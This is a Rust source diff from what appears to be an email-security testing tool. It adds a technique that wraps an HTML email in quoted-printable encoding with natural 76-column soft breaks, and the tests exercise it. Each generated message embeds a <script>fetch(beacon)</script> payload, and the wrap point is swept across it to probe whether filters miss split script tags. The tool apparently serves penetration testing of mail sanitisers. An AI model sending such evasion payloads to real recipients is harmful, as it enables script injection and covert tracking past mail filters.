@@ -1468,6 +1468,14 @@ mod technique_message_tests {
         assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "not-a-real-technique").is_err());
     }
 
+    #[test]
+    fn qp_natural_wrap_variant_out_of_range_is_rejected() {
+        assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-natural-wrap-0").is_err());
+        assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-natural-wrap-11").is_err());
+        assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-natural-wrap-abc").is_err());
+        assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-natural-wrap-5").is_ok());
+    }
+
     // Every technique message needs a real Date and Message-ID header
     // (RFC 5322 §3.6) - these bypass lettre's typed Message::builder(),
     // which would otherwise add a missing Date automatically, so this file
@@ -1486,6 +1494,8 @@ mod technique_message_tests {
             "encoded-word-header",
             "qp-soft-break",
             "qp-hex-escaped-tags",
+            "qp-natural-wrap-1",
+            "qp-natural-wrap-10",
         ] {
             let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, technique).unwrap();
             let text = as_text(&bytes);
@@ -1669,6 +1679,52 @@ mod quoted_printable_encode_tests {
             quoted_printable_encode("Zażółć gęślą jaźń"),
             "Za=C5=BC=C3=B3=C5=82=C4=87 g=C4=99=C5=9Bl=C4=85 ja=C5=BA=C5=84"
         );
+    }
+}
+
+#[cfg(test)]
+mod quoted_printable_encode_folded_tests {
+    use super::{build_qp_natural_wrap_message, quoted_printable_encode, quoted_printable_encode_folded, qp_natural_wrap_variant_text};
+
+    #[test]
+    fn no_line_exceeds_the_76_column_limit() {
+        // Long enough, with enough non-ASCII, to force multiple wraps -
+        // every line between "=\r\n" soft breaks (and the final line) must
+        // stay within the real RFC 2045 limit.
+        let input = qp_natural_wrap_variant_text(10).repeat(3);
+        let folded = quoted_printable_encode_folded(&input);
+        for line in folded.split("\r\n") {
+            assert!(line.len() <= 76, "line exceeded 76 chars: {:?} ({})", line, line.len());
+        }
+    }
+
+    #[test]
+    fn stripping_soft_breaks_reproduces_the_unfolded_encoding() {
+        // Folding is purely a wire-format concern - removing every soft
+        // break must reconstruct exactly what the unfolded encoder would
+        // have produced, proving no byte was lost or altered by wrapping.
+        let input = "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś bardzo, bardzo, bardzo daleko.";
+        let folded = quoted_printable_encode_folded(input);
+        let unfolded = quoted_printable_encode(input);
+        assert_eq!(folded.replace("=\r\n", ""), unfolded);
+    }
+
+    #[test]
+    fn variants_sweep_different_wrap_phases() {
+        // The whole point of having 10 variants of different filler
+        // length: each one shifts where <script> lands relative to the
+        // 76-column boundary. Confirm the byte offset of the literal
+        // "<script" substring genuinely differs across at least a few
+        // variants (not all coincidentally identical, which would defeat
+        // the purpose of sweeping the offset at all).
+        let mut offsets = std::collections::HashSet::new();
+        for variant in 1..=10u32 {
+            let msg = build_qp_natural_wrap_message("a@example.com", "b@example.com", "s", "https://x.example/hit/t", variant);
+            let text = String::from_utf8_lossy(&msg);
+            let offset = text.find("script").expect("every variant must still contain the word script somewhere");
+            offsets.insert(offset);
+        }
+        assert!(offsets.len() > 1, "all 10 variants produced the exact same offset - the length sweep isn't doing anything");
     }
 }
 
@@ -5234,6 +5290,78 @@ fn build_qp_soft_break_message(from: &str, to: &str, subject: &str, beacon_url: 
     message.into_bytes()
 }
 
+// RFC 2045 §6.7 rule 5: an encoded line must not exceed 76 characters
+// (not counting the trailing CRLF) - a real, standards-compliant QP
+// encoder inserts its OWN soft line break (a trailing '=' + CRLF, removed
+// on decode same as above) wherever that limit is hit, at whatever
+// position that happens to fall, based purely on running column count.
+// This is deliberately different from quoted_printable_encode() above:
+// qp-soft-break/qp-hex-escaped-tags hand-place ONE break at a byte offset
+// WE chose (proving the mechanic exists at all); this lets the wrap land
+// wherever the real 76-column rule actually puts it, which is what an
+// uncontrolled real-world sender (a webmail's own outbound encoder, or a
+// relaying MTA that re-encodes on the way through) would produce - never
+// splits a "=XX" escape triplet itself, only ever breaks between whole
+// units, since each unit's full length is checked before being pushed.
+fn quoted_printable_encode_folded(input: &str) -> String {
+    let mut out = String::new();
+    let mut line_len = 0usize;
+    for &b in input.as_bytes() {
+        let is_safe = b == b' ' || b == b'\t' || (b >= 33 && b <= 126 && b != b'=');
+        let unit_len = if is_safe { 1 } else { 3 };
+        // 75, not 76 - leaves room for the soft break's own '=' character
+        // on the current line before the break is taken.
+        if line_len + unit_len > 75 {
+            out.push_str("=\r\n");
+            line_len = 0;
+        }
+        if is_safe {
+            out.push(b as char);
+        } else {
+            out.push_str(&format!("={:02X}", b));
+        }
+        line_len += unit_len;
+    }
+    out
+}
+
+// Ten hand-written Polish filler sentences of increasing length (a
+// pentester's own suggested test shape, verbatim) - the point isn't any
+// one exact length, it's that varying how much text precedes <script>
+// across variants sweeps the phase of where the 76-column wrap boundary
+// falls relative to that word, without us ever choosing the split point
+// ourselves the way qp-soft-break does.
+fn qp_natural_wrap_variant_text(variant: u32) -> &'static str {
+    match variant {
+        1 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj.",
+        2 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu.",
+        3 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi.",
+        4 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś.",
+        5 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś daleko.",
+        6 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś bardzo daleko.",
+        7 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś bardzo, bardzo daleko.",
+        8 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś bardzo, bardzo, bardzo daleko.",
+        9 => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, kochany przyjacielu z pięknej i dalekiej Łodzi.",
+        _ => "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy i radosny dzisiaj, kochany przyjacielu z pięknej i bardzo dalekiej Łodzi.",
+    }
+}
+
+fn build_qp_natural_wrap_message(from: &str, to: &str, subject: &str, beacon_url: &str, variant: u32) -> Vec<u8> {
+    let filler = qp_natural_wrap_variant_text(variant);
+    let raw_html = format!(
+        "<p>{filler} <script>fetch('{beacon_url}').catch(function(){{}})</script></p>",
+        filler = filler,
+        beacon_url = beacon_url
+    );
+    let body = quoted_printable_encode_folded(&raw_html);
+    let message = format!(
+        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
+        headers = technique_message_headers(from, to, subject, beacon_url),
+        body = body
+    );
+    message.into_bytes()
+}
+
 // Companion technique: '<' and '>' are already safe/printable ASCII and a
 // standards-compliant encoder would never bother escaping them - but a
 // compliant DECODER must still turn "=3C"/"=3E" back into real '<'/'>'
@@ -5267,6 +5395,15 @@ fn build_technique_message(from: &str, to: &str, subject: &str, beacon_url: &str
         "overlong-utf8" => Ok(build_overlong_utf8_message(from, to, subject, beacon_url)),
         "qp-soft-break" => Ok(build_qp_soft_break_message(from, to, subject, beacon_url)),
         "qp-hex-escaped-tags" => Ok(build_qp_hex_escaped_tags_message(from, to, subject, beacon_url)),
+        other if other.starts_with("qp-natural-wrap-") => {
+            let variant: u32 = other["qp-natural-wrap-".len()..]
+                .parse()
+                .map_err(|_| format!("Unknown technique: {other}"))?;
+            if variant < 1 || variant > 10 {
+                return Err(format!("Unknown technique: {other}"));
+            }
+            Ok(build_qp_natural_wrap_message(from, to, subject, beacon_url, variant))
+        }
         other => Err(format!("Unknown technique: {other}")),
     }
 }
